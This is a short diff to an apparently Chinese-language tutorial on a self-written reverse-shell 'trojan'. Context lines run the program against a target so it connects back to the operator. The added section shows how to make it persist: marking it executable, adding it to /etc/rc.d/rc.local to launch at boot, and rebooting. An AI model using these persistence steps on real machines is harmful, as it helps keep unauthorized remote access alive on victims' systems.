@@ -126,3 +126,10 @@ system(shell_cmd);
 >>>./shelltest 127.0.0.1 8080 ＃目标电脑木马反向连接自己的电脑
 >>> ls #本地电脑执行命令验证结果
 ```
+### 让我们把这个小“木马”放进开机启动
+```shell
+>>>chmod +x shelltest
+>>>chmod +x /etc/rc.d/rc.local 
+>>>vim /etc/rc.d/rc.local＃编辑它并在里面协商./xxx/xx/xx/shelltest
+>>>reboot #重启看看效果
+```
